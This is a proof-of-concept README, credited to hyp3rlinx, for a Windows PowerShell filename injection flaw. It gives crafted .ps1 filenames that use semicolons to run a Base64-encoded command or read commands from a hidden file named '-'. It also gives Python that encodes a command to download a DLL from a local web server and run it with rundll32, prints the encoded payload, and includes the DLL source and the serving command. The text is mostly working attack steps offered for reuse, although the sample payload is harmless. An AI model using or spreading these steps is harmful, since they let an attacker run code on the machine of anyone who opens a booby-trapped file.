# PSTrojanFile
Windows PowerShell Filename Code Execution POC

Dusted this off and improved it a bit: <br> 
1) Execute a remote DLL using rundll32
2) Execute an unintended secondary PS1 script or hidden text-file

First reported to Microsoft back in 2019 yet remains unfixed as of the time of this writing. <br>  
Remote code execution via a specially crafted filename. <br>  

The flaw is due to semicolon ";" we can decode a Base64 command and execute straight from the PS1 filename or just exec commands.

Test;POweRsHeLL -e [BASE64 PAYLOAD];.ps1 <br>  

OR just call commands straight away <br>  

"Testing;saps (gc -) PoC.ps1"

Vectors: double click, drag and drop to PS shortcut
Requirements: user must have the following setting to call a secondary script
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

Leverages alternate shorthand PS commands like "saps", "gc" start a process and get-content etc.

DLL Execution: create a trojan PS1 file that will try to download and execute a remote DLL namec "1.d"

Python: <br>  
from base64 import b64encode <br>  

b64encode("saps  http[]//127.0.0.1/1.d;sleep -s 2;rundll32 $HOME\\Downloads\\1.d, 0".encode('UTF-16LE')) <br>  

cwBhAHAAcwAgACAAaAB0AHQAcAA6AC8ALwAxADIANwAuADAALgAwAC4AMQAvADEALgBkADsAcwBsAGUAZQBwACAALQBzACAAMgA7AHIAdQBuAGQAbABsADMAMgAgACQASABPAE0ARQBcAEQAbwB3AG4AbABvAGEAZABzAFwAMQAuAGQALAAgADAA

DLL Code:
#include <windows.h>
//gcc -shared -o mydll.dll mydll.c -m32
//hyp3rlinx 
void evilo(void){
MessageBox(0,"Filename Remote Code Execution PoC\r\nBy hyp3rlinx","M$ Windows PowerShell",1);
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
evilo();
return 0;
}

python -m http.server 80

Double click the trojan PS1 file.

Text-file named dash "-" Code Execution.
Create a PS1 file with name including saps "start a process" and gc "get-content", this will read commands from hidden file.
"Test;saps (gc -) PoC.ps1"
Create hidden: attrib +s +h "-"
Double click or drag and drop.



Video PoC:

